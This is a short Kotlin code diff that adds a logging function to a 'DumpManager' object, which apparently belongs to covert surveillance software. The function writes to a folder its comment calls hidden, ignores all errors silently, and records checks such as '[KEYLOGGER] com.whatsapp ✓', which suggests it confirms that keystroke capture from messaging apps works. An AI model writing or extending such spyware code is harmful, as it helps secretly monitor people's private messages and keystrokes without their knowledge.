@@ -54,4 +54,14 @@ object DumpManager {
         cipher.init(Cipher.ENCRYPT_MODE, secretKey)
         return cipher.doFinal(data.toByteArray())
     }
+
+    fun logVerification(category: String, pkg: String) {
+        try {
+            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs() // Ensure hidden folder exists
+            val file = File(ROOT_DIR, "sensor_verification.txt")
+            val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+            // Appends: [14:00:01] [KEYLOGGER] com.whatsapp ✓
+            file.appendText("[$timestamp] [$category] $pkg ✓\n")
+        } catch (e: Exception) { }
+    }
 }
